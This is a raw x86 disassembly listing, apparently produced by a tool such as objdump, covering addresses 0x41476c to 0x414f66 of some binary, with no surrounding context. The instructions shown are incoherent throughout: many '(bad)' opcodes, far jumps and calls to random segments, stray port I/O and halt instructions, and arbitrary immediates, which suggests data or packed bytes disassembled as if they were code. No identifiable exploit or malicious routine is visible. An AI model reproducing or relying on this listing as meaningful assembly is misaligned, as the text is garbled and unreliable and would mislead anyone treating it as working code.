  41476c:	jle    0x414767
  41476e:	fisub  WORD PTR ds:0x81305544
  414774:	fcomp  QWORD PTR [ecx]
  414776:	push   ecx
  414777:	jl     0x414786
  414779:	(bad)  
  41477a:	mov    bl,0x3a
  41477c:	and    al,0x91
  41477e:	jne    0x414768
  414780:	jp     0x414729
  414782:	xor    al,0xe7
  414784:	push   edx
  414785:	shr    eax,cl
  414787:	sub    eax,0xc4417a4e
  41478c:	cdq    
  41478d:	(bad)  
  41478f:	lahf   
  414790:	pop    ss
  414791:	cmp    DWORD PTR [edx+0x2fad14ef],ebx
  414797:	adc    eax,ebx
  414799:	jmp    0x99eed9d2
  41479e:	adc    esi,ecx
  4147a0:	adc    al,0x4d
  4147a2:	and    DWORD PTR [ecx-0x74],ebx
  4147a5:	push   ds
  4147a6:	mov    dl,0x31
  4147a8:	scas   eax,DWORD PTR es:[edi]
  4147a9:	out    0x8,eax
  4147ab:	jne    0x414734
  4147ad:	daa    
  4147ae:	add    eax,DWORD PTR ds:0xa02dd997
  4147b4:	ds inc esp
  4147b6:	into   
  4147b7:	cmp    al,0xc4
  4147b9:	int3   
  4147ba:	push   ecx
  4147bb:	into   
  4147bc:	jmp    0x96ef:0x96244bd2
  4147c3:	sbb    esp,ecx
  4147c5:	pushf  
  4147c6:	jmp    0x8cf4:0x9e56939c
  4147cd:	adc    eax,0x90d62e98
  4147d2:	enter  0x70ef,0x11
  4147d6:	dec    DWORD PTR [eax+0x24ae5be6]
  4147dc:	jl     0x41480c
  4147de:	or     edi,DWORD PTR [eax-0x12398d4a]
  4147e4:	fs pop esi
  4147e6:	xor    DWORD PTR [esi],esp
  4147e8:	jae    0x414838
  4147ea:	out    dx,eax
  4147eb:	imul   ebx,DWORD PTR [ecx-0x35],0x51
  4147ef:	xlat   BYTE PTR ds:[ebx]
  4147f0:	sub    BYTE PTR [edi+0x27],dl
  4147f3:	lods   al,BYTE PTR ds:[esi]
  4147f4:	dec    edi
  4147f5:	sahf   
  4147f6:	std    
  4147f7:	push   0xc1f43b47
  4147fc:	xchg   ebp,eax
  4147fd:	mov    DWORD PTR [ebp-0x2a9ba341],esi
  414803:	call   0xc44e197c
  414808:	leave  
  414809:	push   edx
  41480a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480b:	stos   BYTE PTR es:[edi],al
  41480c:	es inc esp
  41480e:	ror    DWORD PTR [edx-0x34],1
  414811:	jmp    0x41482e
  414813:	scas   al,BYTE PTR es:[edi]
  414814:	daa    
  414815:	inc    esi
  414816:	clc    
  414817:	cdq    
  414818:	repz icebp 
  41481a:	push   edx
  41481b:	push   esp
  41481c:	(bad)  
  41481d:	hlt    
  41481e:	(bad)  
  41481f:	cli    
  414820:	ins    BYTE PTR es:[edi],dx
  414821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414822:	sbb    DWORD PTR ds:0x937d80f0,eax
  414828:	sbb    edi,DWORD PTR [edi+0x5e]
  41482b:	inc    esi
  41482c:	das    
  41482d:	test   al,0xc9
  41482f:	jmp    0x414835
  414831:	push   esp
  414832:	mov    cl,0x8d
  414834:	mov    WORD PTR [ebx],ss
  414836:	or     DWORD PTR [ecx+0x70217b85],edi
  41483c:	pusha  
  41483d:	pop    eax
  41483e:	mov    al,0x4e
  414840:	add    DWORD PTR [edx-0x6f],ebx
  414843:	and    al,0xb0
  414845:	cdq    
  414846:	clc    
  414847:	cli    
  414848:	mov    cs,esp
  41484a:	(bad)  
  41484b:	xchg   DWORD PTR [eax],esi
  41484d:	std    
  41484e:	call   0xcb7e2752
  414853:	lods   al,BYTE PTR ds:[esi]
  414854:	pop    ss
  414855:	les    esi,FWORD PTR [edx-0xb]
  414858:	jo     0x414822
  41485a:	aad    0x15
  41485c:	jns    0x41481d
  41485e:	repnz stos DWORD PTR es:[edi],eax
  414860:	inc    ecx
  414861:	std    
  414862:	pop    DWORD PTR [edx+edi*8+0xe32f057]
  414869:	sub    dl,dh
  41486b:	out    0x6c,eax
  41486d:	cmp    DWORD PTR [eax],esp
  41486f:	add    dh,al
  414871:	inc    ebx
  414872:	add    DWORD PTR [eax-0x48],eax
  414875:	and    bl,0x6d
  414878:	mov    ebp,0xe656e53a
  41487d:	cmp    eax,0x1ea841b2
  414882:	push   ds
  414883:	lock or al,0xdd
  414886:	pop    esp
  414887:	pushf  
  414888:	pop    DWORD PTR ds:0x91dcbd18
  41488e:	test   BYTE PTR [edi-0x50],0x30
  414892:	jne    0x4148a8
  414894:	arpl   WORD PTR [eax-0x8],sp
  414897:	sbb    al,0x37
  414899:	mov    bl,0x3d
  41489b:	xchg   edx,eax
  41489c:	or     DWORD PTR ds:0x2468dd9a,ebx
  4148a2:	aam    0x92
  4148a4:	and    BYTE PTR [ebx+edx*8],bl
  4148a7:	ret    
  4148a8:	mov    dl,0xab
  4148aa:	add    BYTE PTR [edi],ah
  4148ac:	fwait
  4148ad:	pop    ds
  4148ae:	aaa    
  4148af:	jb     0x41486c
  4148b1:	retf   
  4148b2:	outs   dx,DWORD PTR ds:[esi]
  4148b3:	out    dx,al
  4148b4:	stos   BYTE PTR es:[edi],al
  4148b5:	mov    ebp,0x99914b7e
  4148ba:	fidivr DWORD PTR [edx-0x36d4ac97]
  4148c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148c1:	cmc    
  4148c2:	lds    edi,FWORD PTR [ebx-0x2a]
  4148c5:	mov    ecx,0xb9790503
  4148ca:	mov    al,al
  4148cc:	retf   
  4148cd:	cmp    edx,ebx
  4148cf:	out    dx,eax
  4148d0:	ror    DWORD PTR [edi+0x19f5218b],cl
  4148d6:	or     esi,DWORD PTR [esi+0x34dcccbd]
  4148dc:	add    DWORD PTR [edx-0x4a18e0a1],0xffffffa4
  4148e3:	fucomi st,st(1)
  4148e5:	mov    ch,0xcd
  4148e7:	jmp    0x414881
  4148e9:	into   
  4148ea:	mov    eax,ds:0x9b440035
  4148ef:	in     eax,dx
  4148f0:	int3   
  4148f1:	inc    esp
  4148f2:	mov    ds:0x6f3e97d8,al
  4148f7:	dec    ebp
  4148f8:	mov    esp,0x32dbd721
  4148fd:	jle    0x4148e0
  4148ff:	into   
  414900:	aas    
  414901:	cld    
  414902:	outs   dx,DWORD PTR ds:[esi]
  414903:	(bad)  
  414904:	adc    al,cl
  414906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414907:	mov    ebx,0x496570a0
  41490c:	ss aad 0xe2
  41490f:	push   ds
  414910:	pop    ecx
  414911:	sbb    edx,DWORD PTR [ebx]
  414913:	js     0x4148a6
  414915:	loop   0x41498e
  414917:	(bad)  
  414918:	push   edi
  414919:	inc    edx
  41491a:	cmc    
  41491b:	inc    edx
  41491c:	inc    edi
  41491d:	add    DWORD PTR [esi-0x279212c9],edi
  414923:	sti    
  414924:	pusha  
  414925:	mov    ch,BYTE PTR [edx]
  414927:	mov    dh,0x21
  414929:	arpl   bx,sp
  41492b:	pop    ss
  41492c:	lods   eax,DWORD PTR ds:[esi]
  41492d:	(bad)  
  41492e:	jmp    0x414901
  414930:	inc    ebx
  414931:	and    DWORD PTR [esi],esi
  414933:	cdq    
  414934:	sub    dh,BYTE PTR [eax+0x6e]
  414937:	push   cs
  414938:	mov    al,0x6
  41493a:	lods   al,BYTE PTR ds:[esi]
  41493b:	sar    BYTE PTR [edx-0x7a],1
  41493e:	sub    eax,0xf06f7c7c
  414943:	jo     0x4149bd
  414945:	(bad)  
  414946:	jae    0x414923
  414948:	pop    edx
  414949:	adc    al,0xe5
  41494b:	adc    ah,al
  41494d:	fsubr  st,st(3)
  41494f:	loopne 0x41499c
  414951:	jo     0x4148d6
  414953:	imul   eax,DWORD PTR [edi+0x3d424d6a],0x6a
  41495a:	mov    edx,0x48358fdd
  41495f:	dec    ebp
  414960:	inc    edi
  414961:	xchg   ebp,eax
  414962:	lods   al,BYTE PTR ds:[esi]
  414963:	xchg   esi,eax
  414964:	dec    esp
  414965:	ja     0x4149b1
  414967:	outs   dx,DWORD PTR ds:[esi]
  414968:	rcl    BYTE PTR [eax+0x1c4cf0f0],1
  41496e:	clc    
  41496f:	retf   
  414970:	(bad)  
  414971:	jmp    0x6f98:0x8e66f9ee
  414978:	mov    eax,0x9501d2e
  41497d:	add    al,0x5e
  41497f:	sar    DWORD PTR [ebx+eax*1+0x3af5db11],cl
  414986:	inc    esi
  414987:	aad    0x1e
  414989:	mov    ds:0x398b0c0c,al
  41498e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41498f:	xchg   ecx,eax
  414990:	mov    dl,0xc3
  414992:	or     ebx,DWORD PTR [edi+esi*2+0x22]
  414996:	cmp    al,0x31
  414998:	sahf   
  414999:	sbb    eax,0xc9d2a769
  41499e:	mov    eax,ds:0x4b572236
  4149a3:	and    eax,0x9b2fe2e6
  4149a8:	in     eax,0xcc
  4149aa:	mov    ebx,0xeed57e0d
  4149af:	test   DWORD PTR [ecx-0x56c8d053],ebx
  4149b5:	je     0x4149e6
  4149b7:	pop    esp
  4149b8:	outs   dx,DWORD PTR ds:[esi]
  4149b9:	js     0x4149be
  4149bb:	push   cs
  4149bc:	dec    edi
  4149bd:	loop   0x414a09
  4149bf:	inc    ecx
  4149c0:	bound  ebx,QWORD PTR [ebx-0x160c1b3d]
  4149c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c7:	pop    ss
  4149c8:	stos   DWORD PTR es:[edi],eax
  4149c9:	add    al,0xa5
  4149cb:	and    eax,0xd4f7b5b9
  4149d0:	xchg   DWORD PTR ds:0xd40b4c3a,ecx
  4149d6:	and    ebx,DWORD PTR [ebx+0x522bb91d]
  4149dc:	mov    dl,0xc2
  4149de:	xchg   ebx,eax
  4149df:	jg     0x4149f6
  4149e1:	or     al,BYTE PTR [ebx-0x58]
  4149e4:	and    BYTE PTR ds:0x66b69aab,dh
  4149ea:	xchg   edi,eax
  4149eb:	shr    DWORD PTR [ecx],0x2
  4149ee:	adc    edi,DWORD PTR [edx+0x45d1c3d]
  4149f4:	ret    0xe52a
  4149f7:	cmp    ebp,DWORD PTR [esi-0x5]
  4149fa:	test   DWORD PTR [ecx+0x5c734de4],edi
  414a00:	sub    al,ch
  414a02:	inc    edi
  414a03:	rcl    esi,0x97
  414a06:	mov    ebp,0xb0584b7d
  414a0b:	cmp    esi,esi
  414a0d:	(bad)  
  414a0e:	push   edi
  414a0f:	popf   
  414a10:	xchg   esp,eax
  414a11:	dec    edx
  414a12:	mov    ebx,0xaad743db
  414a17:	adc    al,0x32
  414a19:	cdq    
  414a1a:	cli    
  414a1b:	(bad)  
  414a1c:	cmp    al,0xa6
  414a1e:	jecxz  0x414a4a
  414a20:	xchg   BYTE PTR [ecx+0x28],al
  414a23:	push   ebp
  414a24:	sbb    esi,ebp
  414a26:	and    DWORD PTR [edx+0x5e],ecx
  414a29:	mov    esp,0x990a5a43
  414a2e:	lods   al,BYTE PTR ds:[esi]
  414a2f:	cmp    al,0x11
  414a31:	cmp    ebp,ecx
  414a33:	xchg   ecx,eax
  414a34:	ja     0x4149bd
  414a36:	popf   
  414a37:	dec    eax
  414a38:	adc    BYTE PTR [esi],0xa0
  414a3b:	retf   0x72ea
  414a3e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a40:	test   al,0x2c
  414a42:	packuswb mm2,QWORD PTR ds:0x311d397
  414a49:	addr16 inc edi
  414a4b:	imul   eax,DWORD PTR ds:0x58eaa3e,0xe1932a2b
  414a55:	sti    
  414a56:	out    dx,eax
  414a57:	es (bad) 
  414a59:	ins    BYTE PTR es:[edi],dx
  414a5a:	retf   0x31ab
  414a5d:	add    edi,DWORD PTR [edx]
  414a5f:	mov    edi,0xc41bb9d2
  414a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a65:	cmp    ebx,ebp
  414a67:	sub    bh,BYTE PTR [eax+0x5c53757e]
  414a6d:	aas    
  414a6e:	(bad)  
  414a70:	sti    
  414a71:	pushf  
  414a72:	jmp    0xce36ef59
  414a77:	push   0xffffffdd
  414a79:	sub    eax,0x4a0aebdf
  414a7e:	aad    0x3a
  414a80:	sub    edi,edi
  414a82:	std    
  414a83:	cli    
  414a84:	lock pop edi
  414a86:	call   0xf86f:0x3960b81f
  414a8d:	adc    ebp,edx
  414a8f:	aas    
  414a90:	pusha  
  414a91:	adc    DWORD PTR [ebx-0x4c],eax
  414a94:	and    al,0xfa
  414a96:	jg     0x414a93
  414a98:	dec    ebx
  414a99:	inc    ecx
  414a9a:	xchg   ecx,eax
  414a9b:	mov    ds:0xa856ba28,eax
  414aa0:	dec    edx
  414aa1:	pop    edx
  414aa2:	cmp    esp,0xffffff89
  414aa5:	mov    al,ds:0x1d1a6834
  414aaa:	mov    edi,0x99d82625
  414aaf:	test   BYTE PTR [ebx+0x5ed32f58],dh
  414ab5:	fstp   st(6)
  414ab7:	xchg   ebx,eax
  414ab8:	aaa    
  414ab9:	add    ebx,DWORD PTR fs:[eax]
  414abc:	fdiv   st(0),st
  414abe:	jbe    0x414aa8
  414ac0:	clc    
  414ac1:	popa   
  414ac2:	gs pop ds
  414ac4:	mov    eax,0xf4763f7a
  414ac9:	mov    ebx,0x43c3bf91
  414ace:	imul   esi,DWORD PTR [edi-0x4c859306],0xffffffca
  414ad5:	cwde   
  414ad6:	das    
  414ad7:	lods   al,BYTE PTR ds:[esi]
  414ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad9:	or     bh,BYTE PTR [ebx+edi*8]
  414adc:	sahf   
  414add:	sbb    eax,0x4846ac02
  414ae2:	pop    esi
  414ae3:	ss aad 0xea
  414ae6:	mov    ds:0x1dc2ac2e,eax
  414aeb:	fs stos BYTE PTR es:[edi],al
  414aed:	call   0xfae27508
  414af2:	daa    
  414af3:	test   DWORD PTR [ecx],edi
  414af5:	mov    cl,BYTE PTR [esi]
  414af7:	jb     0x414b1e
  414af9:	pusha  
  414afa:	jb     0x414b5f
  414afc:	je     0x414aa8
  414afe:	push   esi
  414aff:	push   esi
  414b00:	and    al,0x51
  414b02:	out    0x1c,al
  414b04:	mov    ebp,0x8d848891
  414b09:	mov    ecx,0x30980fb6
  414b0e:	xchg   ebx,eax
  414b0f:	sahf   
  414b10:	into   
  414b11:	lock push ebx
  414b13:	pop    esp
  414b14:	(bad)  
  414b15:	sti    
  414b16:	and    DWORD PTR [edx-0xade137f],ebx
  414b1c:	jae    0x414b67
  414b1e:	loope  0x414b21
  414b20:	rol    BYTE PTR [ecx+0x33],1
  414b23:	aad    0x8c
  414b25:	xchg   edx,eax
  414b26:	test   eax,0xdf10c4a6
  414b2b:	and    cl,BYTE PTR [edx+0x10aaa643]
  414b31:	dec    esp
  414b32:	xchg   edi,eax
  414b33:	pop    edi
  414b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b35:	mov    edi,0xea92a25a
  414b3a:	popf   
  414b3b:	pusha  
  414b3c:	push   ebp
  414b3d:	dec    esp
  414b3e:	jae    0x414b40
  414b40:	dec    eax
  414b41:	nop
  414b42:	push   edx
  414b43:	ins    BYTE PTR es:[edi],dx
  414b44:	arpl   WORD PTR ds:0x9e9703b2,si
  414b4a:	sub    bh,BYTE PTR [edx-0x38]
  414b4d:	call   0x4a1c:0x3b60e077
  414b54:	test   edx,eax
  414b56:	(bad)
  414b59:	and    DWORD PTR [eax],edx
  414b5b:	add    dl,bh
  414b5d:	scas   eax,DWORD PTR es:[edi]
  414b5e:	xchg   ecx,eax
  414b5f:	cdq    
  414b60:	mov    ah,0x2d
  414b62:	push   eax
  414b63:	and    al,0xd4
  414b65:	and    DWORD PTR ds:0xadd62de3,ebp
  414b6b:	jns    0x414bb3
  414b6d:	cmp    BYTE PTR [ebp+0x755412b7],al
  414b73:	mov    edx,0x80b00bc3
  414b78:	leave  
  414b79:	es mov eax,0x37465bbc
  414b7f:	mov    ecx,0xce7d816f
  414b84:	nop
  414b85:	jl     0x414b7e
  414b87:	fisub  DWORD PTR [eax-0x67]
  414b8a:	push   edi
  414b8b:	fwait
  414b8c:	iret   
  414b8d:	pop    eax
  414b8e:	and    BYTE PTR [eax-0x55],ah
  414b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b92:	imul   edi,DWORD PTR [edx],0x7
  414b95:	int    0x7
  414b97:	add    eax,0x940ee196
  414b9c:	aad    0xa3
  414b9e:	or     dh,ah
  414ba0:	loope  0x414b24
  414ba2:	popf   
  414ba3:	mov    bh,0x40
  414ba5:	pop    ebx
  414ba6:	out    0x57,eax
  414ba8:	pop    es
  414ba9:	sahf   
  414baa:	cmp    eax,edx
  414bac:	sub    esp,esi
  414bae:	or     BYTE PTR [ebp+0x5d],ah
  414bb1:	bound  esp,QWORD PTR [ebp-0x39]
  414bb4:	loop   0x414b93
  414bb6:	sub    eax,edx
  414bb8:	xchg   edi,eax
  414bb9:	mov    ds:0xfd389f13,al
  414bbe:	outs   dx,DWORD PTR ds:[esi]
  414bbf:	inc    esp
  414bc0:	fisub  DWORD PTR [ecx-0xb5fb45e]
  414bc6:	(bad)  
  414bc7:	out    0xe3,al
  414bc9:	hlt    
  414bca:	cmp    al,0x62
  414bcc:	mov    ah,0xbb
  414bce:	xor    DWORD PTR [edx],0xab7dc050
  414bd4:	loope  0x414b6f
  414bd6:	mov    bh,0xb
  414bd8:	and    edx,esi
  414bda:	xchg   BYTE PTR [ecx-0x683988e],dl
  414be0:	je     0x414c36
  414be2:	or     ebx,DWORD PTR [ebp+0x69]
  414be5:	push   0x935839a0
  414bea:	mov    ch,0x7d
  414bec:	(bad)  
  414bed:	and    eax,0xc3147f0f
  414bf2:	jle    0x414b9c
  414bf4:	std    
  414bf5:	std    
  414bf6:	or     edx,DWORD PTR [eax]
  414bf8:	xchg   esi,eax
  414bf9:	ja     0x414c3e
  414bfb:	fwait
  414bfc:	or     al,0x7d
  414bfe:	or     BYTE PTR [edx+0x3c],0x5b
  414c02:	mov    esp,DWORD PTR [edx-0x70b78f55]
  414c08:	out    dx,al
  414c09:	rcr    ebx,1
  414c0b:	test   al,0xb9
  414c0d:	pop    ebx
  414c0e:	mov    es,WORD PTR [edx+0x452143e1]
  414c14:	(bad)  
  414c15:	push   ecx
  414c16:	stos   BYTE PTR es:[edi],al
  414c17:	mov    dh,0xfd
  414c19:	mov    ch,0xbd
  414c1b:	fist   DWORD PTR [edi-0x35]
  414c1e:	pop    ebp
  414c1f:	sub    al,0x99
  414c21:	adc    DWORD PTR [ebp+0x7e67761e],esi
  414c27:	mov    eax,ds:0xe373f6aa
  414c2c:	mov    ebp,ebp
  414c2e:	inc    eax
  414c2f:	ja     0x414c30
  414c31:	push   ebx
  414c32:	dec    edx
  414c33:	ins    BYTE PTR es:[edi],dx
  414c34:	xchg   edi,eax
  414c35:	jno    0x414c9a
  414c37:	pop    ecx
  414c38:	pop    ebx
  414c39:	mov    eax,ds:0x956d8d0
  414c3e:	xacquire xchg DWORD PTR [edx],ebx
  414c41:	ins    DWORD PTR es:[edi],dx
  414c42:	push   DWORD PTR [ebx+0x49]
  414c45:	jmp    0x20d3:0xf0f369cc
  414c4c:	push   esp
  414c4d:	jge    0x414c73
  414c4f:	mov    ds:0xfd0743ad,eax
  414c54:	cmc    
  414c55:	pop    ds
  414c56:	xor    BYTE PTR ds:[ebx-0x21c3240c],bh
  414c5d:	jae    0x414cb0
  414c5f:	inc    esp
  414c60:	cmc    
  414c61:	pop    ebx
  414c62:	and    cl,BYTE PTR [eax-0x69]
  414c65:	(bad)  
  414c66:	and    BYTE PTR [ebp+0x79d8eb0b],bh
  414c6c:	(bad)  
  414c6d:	pushf  
  414c6e:	add    eax,0x57a01aca
  414c73:	and    BYTE PTR [esi-0x72],0x70
  414c77:	or     ecx,ebp
  414c79:	add    al,0x32
  414c7b:	in     eax,dx
  414c7c:	mov    ds,esi
  414c7e:	shl    DWORD PTR [ebx+ebx*8-0x8049981],0x5f
  414c86:	adc    dl,BYTE PTR [edx+0x62]
  414c89:	adc    BYTE PTR [edx],bh
  414c8b:	adc    BYTE PTR [esi],bh
  414c8d:	xor    edi,DWORD PTR [eax-0xb8571ee]
  414c93:	lods   eax,DWORD PTR ds:[esi]
  414c94:	sti    
  414c95:	out    dx,al
  414c96:	push   ebx
	...
  414d13:	add    BYTE PTR [ecx],dl
  414d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d16:	pop    esi
  414d17:	xor    eax,0xa57bfffe
  414d1c:	int    0xa1
  414d1e:	ficom  WORD PTR [esp+ecx*4-0x2f]
  414d22:	add    edi,DWORD PTR [ecx]
  414d24:	sbb    dh,bl
  414d26:	add    BYTE PTR [eax],al
  414d28:	imul   eax,DWORD PTR [edi],0x0
  414d2b:	add    BYTE PTR [esi-0x3e],al
  414d2e:	add    edx,eax
  414d30:	aas    
  414d31:	add    al,0x62
  414d33:	and    eax,ecx
  414d35:	(bad)  
  414d36:	ins    DWORD PTR es:[edi],dx
  414d37:	push   eax
  414d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d39:	push   0x2b4e2169
  414d3e:	mov    esi,0xafb50d2
  414d43:	das    
  414d44:	js     0x414cc8
  414d46:	inc    edi
  414d47:	and    ebp,ebx
  414d49:	popa   
  414d4a:	sti    
  414d4b:	jmp    0x414d09
  414d4d:	add    DWORD PTR [ecx+0x2e],edx
  414d50:	jbe    0x414d15
  414d52:	test   ah,0x7a
  414d55:	test   al,0x34
  414d57:	mov    esp,0x414eb854
  414d5c:	inc    edx
  414d5d:	out    0x1c,al
  414d5f:	push   edi
  414d60:	mov    edx,DWORD PTR [esi+0xeea1703]
  414d66:	popf   
  414d67:	jbe    0x414d43
  414d69:	outs   dx,DWORD PTR ds:[esi]
  414d6a:	rcr    DWORD PTR [eax+edx*1+0x6ec9f2ec],cl
  414d71:	lahf   
  414d72:	pop    eax
  414d73:	nop
  414d74:	cmp    al,0xe
  414d76:	or     ah,bl
  414d78:	jns    0x414d43
  414d7a:	mov    ecx,0x7cf18f9
  414d7f:	sub    cl,bl
  414d81:	xor    al,BYTE PTR [ecx+0x62b0052d]
  414d87:	inc    ebx
  414d88:	mov    ebx,0xd2769675
  414d8d:	mov    cl,cl
  414d8f:	cmp    DWORD PTR ss:[eax],0xbd003046
  414d96:	mov    BYTE PTR [ebx+0x473bc469],dl
  414d9c:	mov    al,ds:0xaaf0cd21
  414da1:	fs inc eax
  414da3:	leave  
  414da4:	out    dx,al
  414da5:	lea    esp,[eax]
  414da7:	adc    dh,ah
  414da9:	test   eax,0xfb2f67ad
  414dae:	je     0x414d95
  414db0:	ins    DWORD PTR es:[edi],dx
  414db1:	out    dx,al
  414db2:	fcomip st,st(1)
  414db4:	push   edi
  414db5:	mov    dh,0x32
  414db7:	in     eax,0x57
  414db9:	fdiv   DWORD PTR [esi+edx*8-0xd]
  414dbd:	xchg   esp,eax
  414dbe:	mov    bl,0xfb
  414dc0:	sub    ah,BYTE PTR [ebx-0x5d]
  414dc3:	les    esp,FWORD PTR [ecx]
  414dc5:	pop    esi
  414dc6:	or     BYTE PTR [ebx],dl
  414dc8:	js     0x414dc0
  414dca:	ror    DWORD PTR [ebp-0x365260ca],0xd3
  414dd1:	in     eax,0xb7
  414dd3:	xchg   esp,eax
  414dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dd5:	sbb    eax,0xb16b3cc4
  414dda:	xchg   ebx,eax
  414ddb:	ins    BYTE PTR es:[edi],dx
  414ddc:	pushf  
  414ddd:	or     ebp,DWORD PTR [eax-0x6f]
  414de0:	test   al,0x53
  414de2:	jp     0x414d76
  414de4:	cld    
  414de5:	ss dec esp
  414de7:	push   ebx
  414de8:	stc    
  414de9:	inc    edx
  414dea:	(bad)  
  414deb:	push   ss
  414dec:	ins    DWORD PTR es:[edi],dx
  414ded:	inc    edi
  414dee:	punpckhbw mm3,QWORD PTR [ecx]
  414df1:	rcl    ebp,0x20
  414df4:	nop
  414df5:	jg     0x414e76
  414df7:	js     0x414e1a
  414df9:	adc    edx,DWORD PTR [eax+0x5]
  414dfc:	cdq    
  414dfd:	lea    ebx,[eax+0x36c2679f]
  414e03:	int3   
  414e04:	gs int 0xb0
  414e07:	test   BYTE PTR [ebx+ecx*2],bh
  414e0a:	or     DWORD PTR [edi],ebp
  414e0c:	ret    0xfcbc
  414e0f:	jne    0x414df4
  414e11:	sbb    al,0xa7
  414e13:	mov    esp,0x1447cfcd
  414e18:	xor    ah,BYTE PTR [eax-0x479e8720]
  414e1e:	scas   ax,WORD PTR es:[edi]
  414e20:	leave  
  414e21:	inc    ecx
  414e22:	mov    dh,0xe1
  414e24:	add    BYTE PTR [esi-0xe],dh
  414e27:	test   bh,bl
  414e29:	xchg   edx,eax
  414e2a:	adc    al,0x99
  414e2c:	xchg   edx,eax
  414e2d:	xchg   ebx,eax
  414e2e:	data16 jae 0x414dee
  414e31:	jb     0x414df1
  414e33:	outs   dx,DWORD PTR ds:[esi]
  414e34:	mov    al,BYTE PTR [edx]
  414e36:	aaa    
  414e37:	push   esi
  414e38:	add    eax,0xd4e942da
  414e3d:	cmc    
  414e3e:	push   ebx
  414e3f:	fcomp  QWORD PTR [edx]
  414e41:	dec    edx
  414e42:	xchg   esp,edx
  414e44:	js     0x414deb
  414e46:	dec    edi
  414e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e48:	push   cs
  414e49:	and    DWORD PTR [ebp+0xfc3fe5a],0xafc0782e
  414e53:	push   edi
  414e54:	loopne 0x414e71
  414e56:	int3   
  414e57:	cdq    
  414e58:	retf   0x7f5d
  414e5b:	ror    BYTE PTR [esp+eax*8-0x6a],0x99
  414e60:	retf   0xfb54
  414e63:	jecxz  0x414e22
  414e65:	sbb    DWORD PTR [edi],ebp
  414e67:	pop    edi
  414e68:	stc    
  414e69:	(bad)  
  414e6a:	aaa    
  414e6b:	dec    esi
  414e6c:	cmp    bl,BYTE PTR [ecx+0x49]
  414e6f:	lahf   
  414e70:	aam    0x6b
  414e72:	adc    ecx,DWORD PTR [edi-0x5c642458]
  414e78:	into   
  414e79:	test   DWORD PTR [esi-0x391a24e9],eax
  414e7f:	pop    edx
  414e80:	sub    DWORD PTR [ebx],0xf
  414e83:	or     al,0x71
  414e85:	mov    al,BYTE PTR [ebx]
  414e87:	pop    ebp
  414e88:	jecxz  0x414e6e
  414e8a:	jae    0x414e0c
  414e8c:	xchg   DWORD PTR [ebx],esp
  414e8e:	cli    
  414e8f:	mov    ah,0x54
  414e91:	addr16 pop ds
  414e93:	(bad)  
  414e94:	out    0x2c,al
  414e96:	add    BYTE PTR [esi],dl
  414e98:	pop    ss
  414e99:	xor    al,0x9c
  414e9b:	enter  0x8ff4,0x89
  414e9f:	mov    ebx,0x2959c460
  414ea4:	cmc    
  414ea5:	mov    ds:0x578fc269,al
  414eaa:	cs dec ebx
  414eac:	pop    ebx
  414ead:	mov    al,0x89
  414eaf:	mov    esp,0x61557051
  414eb4:	jnp    0x414ef4
  414eb6:	xchg   BYTE PTR [ebp+0x42],cl
  414eb9:	pop    esi
  414eba:	icebp  
  414ebb:	(bad)  
  414ebc:	and    BYTE PTR [edi+edi*1-0x31],ch
  414ec0:	jmp    DWORD PTR [ebx+0x335ceb95]
  414ec6:	mov    ch,0xdf
  414ec8:	and    al,0x22
  414eca:	push   edi
  414ecb:	(bad)  
  414ecc:	in     eax,dx
  414ecd:	adc    BYTE PTR [eax-0x39b29f2c],dl
  414ed3:	mov    edi,0x43b604ea
  414ed8:	mov    ch,0xa5
  414eda:	fstp   QWORD PTR [esp+eiz*4+0x3982ec7]
  414ee1:	push   ss
  414ee2:	xor    al,BYTE PTR [edi-0x5b]
  414ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee6:	int    0xf
  414ee8:	cmp    ch,BYTE PTR [esi]
  414eea:	sub    al,0xcc
  414eec:	and    ch,BYTE PTR [esi]
  414eee:	cmp    eax,0xee2e56eb
  414ef3:	in     al,dx
  414ef4:	mov    ch,0xd8
  414ef6:	(bad)  
  414ef7:	adc    DWORD PTR es:[eax+0x3c],ecx
  414efb:	mov    al,ds:0xfea19449
  414f00:	aaa    
  414f01:	inc    edx
  414f02:	inc    edx
  414f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f04:	hlt    
  414f05:	sahf   
  414f06:	sti    
  414f07:	adc    eax,0x1bbb7b12
  414f0c:	mov    dh,0x27
  414f0e:	inc    edx
  414f0f:	or     DWORD PTR [edi-0x3e7e471b],edi
  414f15:	inc    ecx
  414f16:	jmp    0x1e37:0xdc8e0c4c
  414f1d:	mov    cs,WORD PTR [ecx-0x1e0bcf52]
  414f23:	aad    0xdf
  414f25:	int3   
  414f26:	in     eax,dx
  414f27:	push   0xffffffb2
  414f29:	ror    BYTE PTR fs:[edi+0x22cbffb1],cl
  414f30:	xchg   edi,eax
  414f31:	cwde   
  414f32:	cwde   
  414f33:	out    dx,al
  414f34:	(bad)
  414f38:	sub    BYTE PTR [edx+0x58],bh
  414f3b:	and    DWORD PTR [eax],ebp
  414f3d:	xchg   edi,eax
  414f3e:	loop   0x414f63
  414f40:	in     al,dx
  414f41:	mov    DWORD PTR [edx-0x51],esi
  414f44:	loopne 0x414f83
  414f46:	jmp    0xc06df470
  414f4b:	sbb    bl,dl
  414f4d:	or     edi,0x8e6ec937
  414f53:	sub    al,0x65
  414f55:	sti    
  414f56:	call   0xdb14:0x6be573e5
  414f5d:	aaa    
  414f5e:	fwait
  414f5f:	leave  
  414f60:	mov    esi,0x1c2f38cc
  414f65:	iret   
  414f66:	or     eax,DWORD PTR [eax+0x4f]
